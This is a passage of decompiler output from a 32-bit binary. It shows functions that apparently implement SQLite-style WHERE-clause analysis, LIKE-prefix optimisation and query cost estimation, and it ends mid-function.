// 1008523B: using guessed type __int64 __cdecl sub_1008523B(_DWORD, _DWORD);

//----- (10085373) --------------------------------------------------------
BOOL __usercall sub_10085373@<eax>(int a1@<eax>)
{
  return a1 == 72 || a1 >= 76 && a1 <= 80 || a1 == 73;
}

//----- (1008538E) --------------------------------------------------------
char __usercall sub_1008538E@<al>(char *a1@<esi>, int *a2)
{
  int v2; // eax
  __int16 v3; // di
  __int16 v4; // bx
  int v5; // eax
  int v6; // ecx
  int v7; // ecx
  char result; // al
  bool v9; // cf

  v2 = *((_DWORD *)a1 + 3);
  v3 = *(_WORD *)(v2 + 2) & 0x100;
  v4 = *(_WORD *)(*((_DWORD *)a1 + 2) + 2) & 0x100;
  *(_DWORD *)(v2 + 20) = sub_1007596F((unsigned __int8 *)v2, a2);
  *(_DWORD *)(*((_DWORD *)a1 + 2) + 20) = sub_1007596F(*((unsigned __int8 **)a1 + 2), a2);
  v5 = *((_DWORD *)a1 + 3);
  v6 = *(_DWORD *)(v5 + 20);
  *(_DWORD *)(v5 + 20) = *(_DWORD *)(*((_DWORD *)a1 + 2) + 20);
  *(_DWORD *)(*((_DWORD *)a1 + 2) + 20) = v6;
  *(_WORD *)(*((_DWORD *)a1 + 3) + 2) = v4 | *(_WORD *)(*((_DWORD *)a1 + 3) + 2) & 0xFEFF;
  *(_WORD *)(*((_DWORD *)a1 + 2) + 2) = v3 | *(_WORD *)(*((_DWORD *)a1 + 2) + 2) & 0xFEFF;
  v7 = *((_DWORD *)a1 + 2);
  *((_DWORD *)a1 + 2) = *((_DWORD *)a1 + 3);
  result = *a1;
  v9 = (unsigned __int8)*a1 < 0x4Du;
  *((_DWORD *)a1 + 3) = v7;
  if ( !v9 )
  {
    result = ((result - 77) ^ 2) + 77;
    *a1 = result;
  }
  return result;
}

//----- (1008542B) --------------------------------------------------------
int __usercall sub_1008542B@<eax>(int a1@<eax>)
{
  if ( a1 == 72 )
    return 1;
  if ( a1 == 73 )
    return 128;
  return (unsigned __int16)(2 << (a1 - 76));
}

//----- (10085449) --------------------------------------------------------
int __cdecl sub_10085449(int a1, int a2, int a3, __int64 a4, __int16 a5, _DWORD *a6)
{
  int v6; // ebx
  int v7; // edi
  int v8; // eax
  BOOL v9; // eax
  int *v10; // eax
  _DWORD *v11; // ecx
  int v12; // edi
  int v14; // [esp+14h] [ebp-8h]
  char v15; // [esp+1Bh] [ebp-1h]
  unsigned __int16 v16; // [esp+38h] [ebp+1Ch]

  v16 = a5 & 0xFFF;
  v6 = *(_DWORD *)(a1 + 28);
  v14 = *(_DWORD *)(a1 + 20);
  if ( v14 )
  {
    while ( 1 )
    {
      if ( *(_DWORD *)(v6 + 8) != a2
        || (a4 & *(_QWORD *)(v6 + 24)) != 0
        || *(_DWORD *)(v6 + 12) != a3
        || (*(_WORD *)(v6 + 16) & v16) == 0 )
      {
        goto LABEL_18;
      }
      if ( !a6 || *(_WORD *)(v6 + 16) == 128 )
        return v6;
      v7 = *(_DWORD *)v6;
      v15 = *(_BYTE *)(*(_DWORD *)(a6[4] + 16) + 24 * a3 + 22);
      v8 = sub_10075A58(*(_DWORD *)v6) - 97;
      if ( !v8 )
        break;
      if ( v8 != 1 )
      {
        v9 = v15 >= 99;
        goto LABEL_12;
      }
LABEL_13:
      v10 = sub_10075A91(*(_DWORD *)(v7 + 8), *(_DWORD *)(v7 + 12), *(int **)a1);
      v11 = (_DWORD *)a6[2];
      v12 = 0;
      if ( *v11 != a3 )
      {
        while ( v12 < a6[1] )
        {
          ++v11;
          ++v12;
          if ( *v11 == a3 )
            goto LABEL_16;
        }
        return 0;
      }
LABEL_16:
      if ( !v10 || !sub_100593BE((unsigned __int8 *)*v10, *(unsigned __int8 **)(a6[11] + 4 * v12)) )
        return v6;
LABEL_18:
      --v14;
      v6 += 40;
      if ( !v14 )
        return 0;
    }
    v9 = v15 == 97;
LABEL_12:
    if ( !v9 )
      goto LABEL_18;
    goto LABEL_13;
  }
  return 0;
}

//----- (10085562) --------------------------------------------------------
void __usercall sub_10085562(int a1@<edi>, int a2)
{
  int i; // esi

  for ( i = *(_DWORD *)(a1 + 20); --i >= 0; sub_10085C49(a2, a1, i) )
    ;
}

//----- (10085584) --------------------------------------------------------
BOOL __usercall sub_10085584@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, int a3, _DWORD *a4, BOOL *a5)
{
  int v6; // esi
  _DWORD *v8; // eax
  _BYTE *v9; // eax
  unsigned __int8 *v10; // edx
  _DWORD *v11; // eax
  _DWORD *v12; // esi
  int v13; // edi
  int v14; // eax
  unsigned __int8 *v15; // esi
  char v16; // al
  unsigned __int8 *v17; // esi
  int *v18; // eax
  int v19; // ecx
  int v20; // eax
  int v21; // eax
  int v22; // edi
  _BYTE *v23; // eax
  BOOL v24; // eax
  _DWORD *v25; // eax
  int v26; // eax
  _DWORD *v27; // edi
  int v28; // ebx
  int *v29; // edx
  int v30; // ecx
  int v32; // [esp+10h] [ebp-14h]
  int *v33; // [esp+14h] [ebp-10h]
  int v34; // [esp+18h] [ebp-Ch]
  _BYTE *v35; // [esp+1Ch] [ebp-8h]
  char v36[3]; // [esp+20h] [ebp-4h] BYREF

  v6 = *(_DWORD *)a3;
  v35 = 0;
  v32 = *(_DWORD *)a3;
  v33 = 0;
  if ( *(_BYTE *)a2 == 0x97 )
  {
    v8 = *(_DWORD **)(a2 + 16);
    if ( v8 )
    {
      if ( *v8 == 2 )
      {
        v9 = sub_10059297(*(_BYTE **)(a2 + 4));
        v11 = sub_100697AC((size_t)v9, 2, v6, v10, 1, 0);
        v12 = v11;
        if ( v11 )
        {
          if ( (*((_BYTE *)v11 + 3) & 1) != 0 )
          {
            memcpy(v36, (const void *)v11[1], sizeof(v36));
            v13 = *(_DWORD *)(a2 + 16);
            *a1 = (*((_BYTE *)v12 + 3) & 2) == 0;
            v14 = *(_DWORD *)(v13 + 12);
            v15 = *(unsigned __int8 **)(v14 + 20);
            if ( *v15 == 0x98 && sub_100758D6(*(unsigned __int8 **)(v14 + 20)) == 97 )
            {
              if ( (v16 = *((_BYTE *)sub_1007596F(v15, (int *)a3) + 5), v16 == 1) && !*a1 || v16 == 2 && *a1 )
              {
                v17 = **(unsigned __int8 ***)(v13 + 12);
                v34 = *v17;
                if ( v34 == 132 )
                  v34 = v17[35];
                if ( v34 == 133 )
                {
                  v18 = sub_1005C654(*((__int16 *)v17 + 14), *(int **)(a3 + 460));
                  v33 = v18;
                  if ( v18 && *((_BYTE *)v18 + 30) == 3 )
                    v35 = (_BYTE *)sub_100530C6((int)v18);
                  v19 = *((__int16 *)v17 + 14);
                  v20 = *(_DWORD *)(a3 + 12);
                  if ( v19 <= 32 )
                    *(_DWORD *)(v20 + 212) |= 1 << (v19 - 1);
                  else
                    *(_DWORD *)(v20 + 212) = -1;
                }
                else
                {
                  if ( v34 != 94 )
                  {
LABEL_48:
                    sub_1005AA4D(v33);
                    return v35 != 0;
                  }
                  v35 = (_BYTE *)*((_DWORD *)v17 + 1);
                }
                if ( v35 )
                {
                  v21 = (char)*v35;
                  v22 = 0;
                  if ( !*v35 )
                    goto LABEL_47;
                  do
                  {
                    if ( v21 == v36[0] )
                      break;
                    if ( v21 == v36[1] )
                      break;
                    if ( v21 == v36[2] )
                      break;
                    v21 = (char)v35[++v22];
                  }
                  while ( v35[v22] );
                  if ( v22 && v21 && (v23 = &v35[v22], v35[v22 - 1] != 0xFF) )
                  {
                    v24 = *v23 == v36[0] && !v23[1];
                    *a5 = v24;
                    v25 = sub_10075D3B(v32, 94);
                    if ( v25 )
                      *(_BYTE *)(v22 + v25[1]) = 0;
                    *a4 = v25;
                    if ( v34 == 133 )
                    {
                      v26 = *((__int16 *)v17 + 14);
                      v27 = *(_DWORD **)(a3 + 12);
                      if ( v26 <= 32 )
                        v27[53] |= 1 << (v26 - 1);
                      else
                        v27[53] = -1;
                      if ( *a5 && *(_BYTE *)(*((_DWORD *)v17 + 1) + 1) )
                      {
                        v28 = sub_10078A55(a3);
                        sub_10077418(v29, v17, v28);
                        v30 = v27[3];
                        if ( !__OFSUB__(v30, v30 - 1) && v30 != v30 - 1 )
                          *(_DWORD *)(20 * (v30 - 1) + v27[5] + 12) = 0;
                        sub_10078A70(a3, v28);
                      }
                    }
                  }
                  else
                  {
LABEL_47:
                    v35 = 0;
                  }
                }
                goto LABEL_48;
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
// 100855D2: variable 'v10' is possibly undefined
// 100857AD: variable 'v29' is possibly undefined

//----- (100857F3) --------------------------------------------------------
int __cdecl sub_100857F3(int a1, int *a2, int a3)
{
  int v3; // esi
  int result; // eax
  int v5; // ebx
  int v6; // eax
  int v7; // edi
  int v8; // ecx
  int v9; // edx
  _DWORD *v10; // esi
  int v11; // eax
  unsigned __int8 **v12; // ecx
  int v13; // esi
  unsigned __int8 **v14; // ecx
  __int64 v15; // rax
  int *v16; // esi
  int v17; // edi
  __int64 v18; // rax
  int v19; // edi
  _BYTE *v20; // esi
  void **v21; // eax
  int v22; // edi
  _DWORD *v23; // eax
  _DWORD *v24; // eax
  _DWORD *v25; // eax
  int v26; // esi
  int v27; // eax
  int i; // [esp+Ch] [ebp-4Ch]
  int v29; // [esp+Ch] [ebp-4Ch]
  int *v30; // [esp+10h] [ebp-48h]
  int v31; // [esp+14h] [ebp-44h]
  int v32; // [esp+14h] [ebp-44h]
  int v33; // [esp+14h] [ebp-44h]
  int *j; // [esp+14h] [ebp-44h]
  int v35; // [esp+18h] [ebp-40h]
  int v36; // [esp+1Ch] [ebp-3Ch]
  __int64 v37; // [esp+20h] [ebp-38h]
  int v38; // [esp+20h] [ebp-38h]
  unsigned __int8 **v39; // [esp+2Ch] [ebp-2Ch]
  int v40; // [esp+2Ch] [ebp-2Ch]
  __int64 v41; // [esp+30h] [ebp-28h]
  int v42; // [esp+30h] [ebp-28h]
  int v43; // [esp+3Ch] [ebp-1Ch]
  __int64 v44; // [esp+40h] [ebp-18h]
  int v45; // [esp+40h] [ebp-18h]
  int *v46; // [esp+48h] [ebp-10h]
  int v47; // [esp+4Ch] [ebp-Ch]
  unsigned __int64 v48; // [esp+50h] [ebp-8h]

  v3 = 40 * a3 + a2[7];
  v47 = 40 * a3;
  v46 = (int *)*a2;
  v43 = *(_DWORD *)v3;
  v35 = *(_DWORD *)*a2;
  v36 = v3;
  v30 = (int *)a2[1];
  result = (int)sub_1005904B(v35, 0x168u);
  v5 = result;
  *(_DWORD *)(v3 + 12) = result;
  if ( result )
  {
    *(_BYTE *)(v3 + 18) |= 0x10u;
    sub_10085098((_DWORD *)result, *a2, (int)v30);
    sub_100851CA(v5, (unsigned __int8 *)v43, 68);
    v6 = *(_DWORD *)(v5 + 20) - 1;
    v31 = v6;
    if ( v6 >= 0 )
    {
      while ( 1 )
      {
        sub_10085C49(a1, v5, v6);
        if ( --v31 < 0 )
          break;
        v6 = v31;
      }
    }
    result = v35;
    if ( !*(_BYTE *)(v35 + 30) )
    {
      v44 = -1i64;
      v7 = *(_DWORD *)(v5 + 28);
      v8 = ~a2[2];
      v9 = ~a2[3];
      v48 = __PAIR64__(v9, v8);
      for ( i = *(_DWORD *)(v5 + 20) - 1; i >= 0; v7 += 40 )
      {
        if ( !v44 )
          break;
        if ( (unsigned __int8)*(_WORD *)(v7 + 16) )
        {
          if ( (*(_BYTE *)(v7 + 18) & 8) == 0 )
          {
            v15 = sub_1008520A(v30, *(_DWORD *)(v7 + 8));
            v37 = v15;
            if ( (*(_BYTE *)(v7 + 18) & 2) != 0 )
              v37 = sub_1008520A(v30, *(_DWORD *)(40 * *(_DWORD *)(v7 + 4) + *(_DWORD *)(v5 + 28) + 8)) | v15;
            v44 &= v37;
            if ( *(_WORD *)(v7 + 16) == 2 )
              v48 &= v37;
            else
              v48 = 0i64;
          }
        }
        else
        {
          v48 = 0i64;
          v10 = sub_10059073(v35, 352);
          if ( v10 )
          {
            *(_BYTE *)(v7 + 18) |= 0x20u;
            v41 = 0i64;
            *(_DWORD *)(v7 + 12) = v10;
            *(_WORD *)(v7 + 16) = 512;
            sub_10085098(v10, *a2, (int)v30);
            sub_100851CA((int)v10, *(unsigned __int8 **)v7, 69);
            v11 = v10[5] - 1;
            v32 = v11;
            if ( v11 >= 0 )
            {
              while ( 1 )
              {
                sub_10085C49(a1, v10, v11);
                if ( --v32 < 0 )
                  break;
                v11 = v32;
              }
            }
            if ( !*(_BYTE *)(v35 + 30) )
            {
              v12 = (unsigned __int8 **)v10[7];
              v13 = v10[5];
              v39 = v12;
              if ( v13 > 0 )
              {
                do
                {
                  if ( sub_10085373(**v12) )
                  {
                    v41 |= sub_1008520A(v30, (int)v14[2]);
                    v14 = v39;
                  }
                  v12 = v14 + 10;
                  --v13;
                  v39 = v12;
                }
                while ( v13 );
              }
            }
            v44 &= v41;
          }
          v3 = v36;
        }
        --i;
        v9 = HIDWORD(v48);
        v8 = v48;
      }
      *(_QWORD *)(v5 + 352) = v44;
      result = HIDWORD(v44) | v44;
      if ( v44 )
        result = 256;
      *(_WORD *)(v3 + 16) = result;
      if ( __PAIR64__(v8, v9) )
      {
        v33 = 0;
        v42 = -1;
        v38 = -1;
        v40 = 0;
        while ( !v33 )
        {
          v16 = *(int **)(v5 + 28);
          v17 = *(_DWORD *)(v5 + 20) - 1;
          v29 = v17;
          if ( v17 < 0 )
            return result;
          while ( 1 )
          {
            result = v16[2];
            *((_BYTE *)v16 + 18) &= ~0x40u;
            if ( result != v38 )
            {
              v18 = sub_1008520A(v30, result);
              result = HIDWORD(v48) & HIDWORD(v18) | v48 & v18;
              if ( result )
                break;
            }
            --v17;
            v16 += 10;
            v29 = v17;
            if ( v17 < 0 )
              goto LABEL_41;
          }
          v42 = v16[3];
          result = v16[2];
          v38 = result;
LABEL_41:
          if ( v17 < 0 )
            return result;
          v33 = 1;
          do
          {
            if ( !v33 )
              break;
            result = v38;
            if ( v16[2] == v38 )
            {
              result = v42;
              if ( v16[3] == v42
                && ((v19 = *v16,
                     result = sub_100758D6(*(unsigned __int8 **)(*v16 + 12)),
                     v45 = (char)result,
                     !(_BYTE)result)
                 || (result = sub_100758D6(*(unsigned __int8 **)(v19 + 8)), v45 == (char)result)) )
              {
                *((_BYTE *)v16 + 18) |= 0x40u;
              }
              else
              {
                v33 = 0;
              }
            }
            else
            {
              *((_BYTE *)v16 + 18) &= ~0x40u;
            }
            --v29;
            v16 += 10;
          }
          while ( v29 >= 0 );
          if ( ++v40 >= 2 )
          {
            if ( !v33 )
              return result;
            break;
          }
        }
        v20 = *(_BYTE **)(v5 + 28);
        v21 = 0;
        v22 = *(_DWORD *)(v5 + 20) - 1;
        for ( j = 0; v22 >= 0; v20 += 40 )
        {
          if ( (v20[18] & 0x40) != 0 )
          {
            v23 = sub_1007631C(v35, *(void ***)(*(_DWORD *)v20 + 12), 0);
            j = sub_100766CA((int *)*a2, j, (unsigned int)v23);
            v21 = *(void ***)(*(_DWORD *)v20 + 8);
          }
          --v22;
        }
        v24 = sub_1007631C(v35, v21, 0);
        v25 = sub_10075DC6(0, 0, v46, 72, (unsigned int)v24);
        if ( v25 )
        {
          *((_WORD *)v25 + 1) |= *(_BYTE *)(v43 + 2) & 1;
          *((_WORD *)v25 + 16) = *(_WORD *)(v43 + 32);
          v25[4] = j;
          v26 = sub_10085130((int)a2, (unsigned int)v25, 3);
          sub_10085C49(a1, a2, v26);
          v27 = a2[7];
          *(_DWORD *)(40 * v26 + v27 + 4) = a3;
          v36 = v27 + v47;
          *(_BYTE *)(v27 + v47 + 19) = 1;
        }
        else
        {
          sub_100767B1(j, v35);
        }
        result = v36;
        *(_WORD *)(v36 + 16) = 0;
      }
    }
  }
  return result;
}
// 1008597E: variable 'v14' is possibly undefined
// 10085C49: using guessed type _DWORD __cdecl sub_10085C49(_DWORD, _DWORD, _DWORD);

//----- (10085C49) --------------------------------------------------------
void __cdecl sub_10085C49(int a1, int a2, int a3)
{
  int v3; // edi
  unsigned __int8 *v4; // esi
  int v5; // eax
  int v6; // edx
  __int64 v7; // rax
  __int64 v8; // rax
  bool v9; // zf
  __int64 v10; // rax
  unsigned int v11; // eax
  int v12; // edx
  int v13; // eax
  _BYTE *v14; // edx
  unsigned __int8 *v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  __int16 v19; // ax
  int v20; // edx
  _DWORD *v21; // edi
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  int v24; // esi
  int v25; // eax
  void **v26; // edi
  _DWORD *v27; // eax
  _BYTE *v28; // eax
  int v29; // ecx
  unsigned __int8 *v30; // ecx
  unsigned __int8 v31; // al
  _DWORD *v32; // eax
  _DWORD *v33; // eax
  _DWORD *v34; // eax
  _DWORD *v35; // eax
  int v36; // esi
  _DWORD *v37; // eax
  int v38; // eax
  void **v39; // esi
  int v40; // edx
  __int64 v41; // rax
  _DWORD *v42; // eax
  _DWORD *v43; // eax
  int v44; // eax
  int v45; // ecx
  int v46; // ecx
  int *v47; // [esp+Ch] [ebp-3Ch]
  int v48; // [esp+10h] [ebp-38h]
  int *v49; // [esp+14h] [ebp-34h]
  unsigned __int8 *v50; // [esp+18h] [ebp-30h]
  int v51; // [esp+1Ch] [ebp-2Ch]
  __int64 v52; // [esp+20h] [ebp-28h]
  int v53; // [esp+20h] [ebp-28h]
  int v54; // [esp+28h] [ebp-20h]
  int v55; // [esp+28h] [ebp-20h]
  int v56; // [esp+28h] [ebp-20h]
  unsigned int v57; // [esp+28h] [ebp-20h]
  void *Src; // [esp+2Ch] [ebp-1Ch] BYREF
  BOOL v59; // [esp+30h] [ebp-18h] BYREF
  int v60; // [esp+34h] [ebp-14h] BYREF
  __int64 v61; // [esp+38h] [ebp-10h]
  __int64 v62; // [esp+40h] [ebp-8h]

  v62 = 0i64;
  Src = 0;
  v59 = 0;
  v60 = 0;
  v49 = *(int **)a2;
  v48 = **(_DWORD **)a2;
  if ( *(_BYTE *)(v48 + 30) )
    return;
  v3 = 40 * a3 + *(_DWORD *)(a2 + 28);
  v4 = *(unsigned __int8 **)v3;
  v51 = 40 * a3;
  v47 = *(int **)(a2 + 4);
  v50 = *(unsigned __int8 **)v3;
  LODWORD(v52) = sub_1008523B(v47, *(_DWORD *)(*(_DWORD *)v3 + 8));
  v5 = *v4;
  HIDWORD(v52) = v6;
  v54 = v5;
  if ( v5 == 72 )
  {
    if ( (*((_WORD *)v4 + 1) & 0x800) != 0 )
      LODWORD(v7) = sub_10085308(*((_DWORD *)v4 + 4), (int)v47);
    else
      v7 = sub_100852B6((int)v47, (int *)*((_DWORD *)v4 + 4));
  }
  else
  {
    if ( v5 == 73 )
    {
      *(_DWORD *)(v3 + 24) = 0;
      *(_DWORD *)(v3 + 28) = 0;
      goto LABEL_10;
    }
    LODWORD(v7) = sub_1008523B(v47, *((_DWORD *)v4 + 3));
  }
  *(_QWORD *)(v3 + 24) = v7;
LABEL_10:
  LODWORD(v8) = sub_1008523B(v47, (int)v4);
  v9 = (v4[2] & 1) == 0;
  v61 = v8;
  if ( !v9 )
  {
    v10 = sub_1008520A(v47, *((__int16 *)v4 + 16));
    v61 |= v10;
    v62 = v10 - 1;
  }
  v11 = v61;
  *(_DWORD *)(v3 + 8) = -1;
  *(_DWORD *)(v3 + 4) = -1;
  *(_QWORD *)(v3 + 32) = __PAIR64__(HIDWORD(v61), v11);
  *(_WORD *)(v3 + 16) = 0;
  if ( !sub_10085373(v54) || (v52 & *(_QWORD *)(v3 + 24)) != 0 )
  {
    if ( *v4 == 71 && *(_BYTE *)(a2 + 16) == 69 )
    {
      LODWORD(v61) = *((_DWORD *)v4 + 4);
      v56 = v12;
      v53 = v12;
      do
      {
        v21 = sub_1007631C(v48, *(void ***)(v53 + *(_DWORD *)(v61 + 12)), 0);
        v22 = sub_1007631C(v48, *((void ***)v4 + 2), 0);
        v23 = sub_10075DC6(0, (unsigned int)v21, v49, (unsigned __int8)byte_100FC5F0[v56], (unsigned int)v22);
        v24 = sub_10085130(a2, (unsigned int)v23, 3);
        sub_10085C49(a1, a2, v24);
        v25 = *(_DWORD *)(a2 + 28);
        v53 += 20;
        ++v56;
        v3 = v25 + v51;
        *(_DWORD *)(40 * v24 + v25 + 4) = a3;
        v4 = v50;
      }
      while ( v53 < 40 );
      *(_BYTE *)(v3 + 19) = 2;
    }
    else if ( *v4 == 68 )
    {
      sub_100857F3(a1, (int *)a2, a3);
      v3 = v51 + *(_DWORD *)(a2 + 28);
    }
    goto LABEL_32;
  }
  v13 = *((_DWORD *)v4 + 2);
  v14 = (_BYTE *)*((_DWORD *)v4 + 3);
  if ( *(_BYTE *)v13 == 0x98 )
  {
    *(_DWORD *)(v3 + 8) = *(_DWORD *)(v13 + 24);
    *(_DWORD *)(v3 + 12) = *(__int16 *)(v13 + 28);
    *(_WORD *)(v3 + 16) = sub_1008542B(v54);
  }
  if ( !v14 || *v14 != 0x98 )
  {
LABEL_32:
    if ( *(_BYTE *)(a2 + 16) == 69 && sub_10085584(&v60, (int)v4, (int)v49, &Src, &v59) )
    {
      v26 = *(void ***)(*(_DWORD *)(*((_DWORD *)v4 + 4) + 12) + 20);
      LODWORD(v61) = v26;
      v27 = sub_1007631C(v48, (void **)Src, 0);
      v57 = (unsigned int)v27;
      if ( !*(_BYTE *)(v48 + 30) )
      {
        v28 = sub_10059297((_BYTE *)v27[1]);
        v30 = &v28[v29 - 1];
        v31 = *v30;
        if ( v60 )
        {
          if ( v31 == 64 )
            v59 = 0;
          v31 = byte_100FEEC0[v31];
        }
        *v30 = v31 + 1;
      }
      v32 = sub_1007631C(v48, v26, 0);
      v33 = sub_10075DC6(0, (unsigned int)Src, v49, 80, (unsigned int)v32);
      v60 = sub_10085130(a2, (unsigned int)v33, 3);
      sub_10085C49(a1, a2, v60);
      v34 = sub_1007631C(v48, (void **)v61, 0);
      v35 = sub_10075DC6(0, v57, v49, 79, (unsigned int)v34);
      v36 = sub_10085130(a2, (unsigned int)v35, 3);
      sub_10085C49(a1, a2, v36);
      v3 = v51 + *(_DWORD *)(a2 + 28);
      if ( v59 )
      {
        *(_DWORD *)(40 * v60 + *(_DWORD *)(a2 + 28) + 4) = a3;
        *(_DWORD *)(40 * v36 + *(_DWORD *)(a2 + 28) + 4) = a3;
        *(_BYTE *)(v3 + 19) = 2;
      }
      v4 = v50;
    }
    if ( *v4 == 0x97 && !sub_100593BE(*((unsigned __int8 **)v4 + 1), (unsigned __int8 *)aMatch_0) )
    {
      v37 = (_DWORD *)*((_DWORD *)v4 + 4);
      if ( *v37 == 2 && **(_BYTE **)(v37[3] + 20) == 0x98 )
      {
        v38 = *(_DWORD *)(*((_DWORD *)v4 + 4) + 12);
        v39 = *(void ***)v38;
        v60 = *(_DWORD *)(v38 + 20);
        LODWORD(v61) = sub_1008523B(v47, (int)v39);
        HIDWORD(v61) = v40;
        LODWORD(v41) = sub_1008523B(v47, v60);
        if ( (v61 & v41) == 0 )
        {
          v42 = sub_1007631C(v48, v39, 0);
          v43 = sub_10075DC6(0, (unsigned int)v42, v49, 50, 0);
          v44 = *(_DWORD *)(a2 + 28) + 40 * sub_10085130(a2, (unsigned int)v43, 3);
          *(_QWORD *)(v44 + 24) = v61;
          v45 = v60;
          *(_DWORD *)(v44 + 8) = *(_DWORD *)(v60 + 24);
          *(_DWORD *)(v44 + 12) = *(__int16 *)(v45 + 28);
          *(_WORD *)(v44 + 16) = 64;
          *(_DWORD *)(v44 + 4) = a3;
          v3 = v51 + *(_DWORD *)(a2 + 28);
          v46 = *(_DWORD *)(v3 + 32);
          *(_BYTE *)(v3 + 18) |= 8u;
          *(_BYTE *)(v3 + 19) = 1;
          *(_DWORD *)(v44 + 32) = v46;
          *(_DWORD *)(v44 + 36) = *(_DWORD *)(v3 + 36);
        }
      }
    }
    *(_QWORD *)(v3 + 24) |= v62;
    return;
  }
  if ( *(int *)(v3 + 8) < 0 )
  {
    v55 = v3;
    goto LABEL_24;
  }
  v15 = (unsigned __int8 *)sub_1007631C(v48, (void **)v4, 0);
  v4 = v15;
  if ( *(_BYTE *)(v48 + 30) )
  {
    sub_10075FD8(v48, (unsigned int)v15);
    return;
  }
  v16 = sub_10085130(a2, (unsigned int)v15, 3);
  if ( v16 )
  {
    v17 = *(_DWORD *)(a2 + 28) + 40 * v16;
    *(_DWORD *)(v17 + 4) = a3;
    v3 = v51 + *(_DWORD *)(a2 + 28);
    v55 = v17;
    *(_BYTE *)(v3 + 18) |= 8u;
    *(_BYTE *)(v3 + 19) = 1;
LABEL_24:
    sub_1008538E((char *)v4, v49);
    v18 = *((_DWORD *)v4 + 2);
    *(_DWORD *)(v55 + 8) = *(_DWORD *)(v18 + 24);
    *(_DWORD *)(v55 + 12) = *(__int16 *)(v18 + 28);
    *(_QWORD *)(v55 + 24) = v52;
    *(_QWORD *)(v55 + 32) = v61;
    v19 = sub_1008542B(*v4);
    v4 = v50;
    *(_WORD *)(v20 + 16) = v19;
    goto LABEL_32;
  }
}
// 10085CB5: variable 'v6' is possibly undefined
// 10085D00: variable 'v7' is possibly undefined
// 10085D16: variable 'v8' is possibly undefined
// 10085DAF: variable 'v14' is possibly undefined
// 10085E69: variable 'v20' is possibly undefined
// 10085E8D: variable 'v12' is possibly undefined
// 10085FA6: variable 'v29' is possibly undefined
// 100860C5: variable 'v40' is possibly undefined
// 100860CE: variable 'v41' is possibly undefined

//----- (1008616A) --------------------------------------------------------
int __usercall sub_1008616A@<eax>(_DWORD *a1@<esi>, int *a2, int a3, int a4)
{
  __int64 v4; // rax
  int v5; // ebx
  int v6; // edi
  int v7; // eax
  int v8; // edx
  int v10; // [esp+Ch] [ebp-4h]

  v4 = sub_1008520A(a2, a4);
  v5 = ~(_DWORD)v4;
  v10 = ~HIDWORD(v4);
  if ( a3 >= *a1 )
    return 0;
  v6 = 20 * a3;
  while ( 1 )
  {
    v7 = sub_1008523B(a2, *(_DWORD *)(v6 + a1[3]));
    ++a3;
    v6 += 20;
    if ( v10 & v8 | v5 & v7 )
      break;
    if ( a3 >= *a1 )
      return 0;
  }
  return 1;
}
// 1008619E: variable 'v8' is possibly undefined

//----- (100861C1) --------------------------------------------------------
BOOL __usercall sub_100861C1@<eax>(int *a1@<eax>, int a2@<edi>, int *a3, int *a4, int a5, int a6, _DWORD *a7)
{
  int v8; // ebx
  _BYTE *v9; // eax
  int *v10; // eax
  unsigned __int8 *v11; // edx
  _BYTE *v13; // [esp+8h] [ebp-24h]
  int v14; // [esp+Ch] [ebp-20h]
  int v15; // [esp+10h] [ebp-1Ch]
  unsigned __int8 **v16; // [esp+14h] [ebp-18h]
  int v17; // [esp+18h] [ebp-14h]
  int v18; // [esp+1Ch] [ebp-10h]
  int v19; // [esp+20h] [ebp-Ch]
  int i; // [esp+24h] [ebp-8h]
  int v21; // [esp+28h] [ebp-4h]

  v8 = 0;
  v14 = *a3;
  v18 = 0;
  v17 = *a1;
  v21 = 0;
  for ( i = a1[3]; v21 < v17; ++v8 )
  {
    if ( v8 > *(_DWORD *)(a2 + 4) )
      break;
    v9 = *(_BYTE **)i;
    v13 = *(_BYTE **)i;
    if ( **(_BYTE **)i != 0x98 || *((_DWORD *)v9 + 6) != a5 )
      break;
    v10 = sub_1007596F(v9, a3);
    v16 = (unsigned __int8 **)v10;
    if ( !v10 )
    {
      v10 = *(int **)(v14 + 44);
      v16 = (unsigned __int8 **)v10;
    }
    if ( *(_DWORD *)a2 && v8 < *(_DWORD *)(a2 + 4) )
    {
      v19 = *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v8);
      if ( v19 == *(_DWORD *)(*(_DWORD *)(a2 + 16) + 8) )
        v19 = -1;
      v15 = *(unsigned __int8 *)(*(_DWORD *)(a2 + 40) + v8);
      v11 = *(unsigned __int8 **)(*(_DWORD *)(a2 + 44) + 4 * v8);
    }
    else
    {
      v19 = -1;
      v15 = 0;
      v11 = (unsigned __int8 *)*v10;
    }
    if ( *((__int16 *)v13 + 14) != v19 || sub_100593BE(*v16, v11) )
    {
      if ( v8 >= a6 )
      {
        if ( v8 != *(_DWORD *)(a2 + 4) )
          return 0;
        break;
      }
    }
    else
    {
      if ( v8 <= a6 )
      {
        v18 = v15 ^ *(unsigned __int8 *)(i + 12);
      }
      else if ( (v15 ^ *(unsigned __int8 *)(i + 12)) != v18 )
      {
        return 0;
      }
      ++v21;
      i += 20;
      if ( v19 < 0 && !sub_1008616A(a1, a4, v21, a5) )
        v21 = v17;
    }
  }
  *a7 = v18 != 0;
  return v21 >= v17 || *(_BYTE *)(a2 + 24) && v8 == *(_DWORD *)(a2 + 4) && !sub_1008616A(a1, a4, v21, a5);
}

//----- (1008631F) --------------------------------------------------------
double __cdecl sub_1008631F(double a1)
{
  double v1; // st6
  double v2; // st4
  double v3; // st5
  double v5; // rt1
  double v6; // st4
  double v7; // rt2
  double v8; // rtt
  double v9; // st4
  double v10; // st6
  double v11; // rt0
  double v12; // st4
  double v13; // st5
  double v14; // st4

  v1 = 1.0;
  v2 = 10.0;
  v3 = 10.0;
  if ( a1 <= 10.0 )
    return 1.0;
  while ( 1 )
  {
    v8 = v2;
    v9 = v1;
    v10 = v8;
    v11 = v9 + 1.0;
    v12 = v3;
    v13 = v11;
    v14 = v12 * v8;
    if ( v14 >= a1 )
      break;
    v5 = v14;
    v6 = v13;
    v3 = v5;
    v7 = v6;
    v2 = v10;
    v1 = v7;
  }
  return v13;
}

//----- (10086360) --------------------------------------------------------
int __cdecl sub_10086360(int *a1, int *a2, int a3, __int64 a4, int a5, int a6)
{
  int *v6; // edi
  __int64 v7; // rax
  unsigned int v8; // ebx
  _DWORD *v9; // ecx
  unsigned int v10; // esi
  int v11; // ecx
  int v12; // ecx
  __int16 v13; // fps
  double v14; // st7
  bool v15; // c0
  char v16; // c2
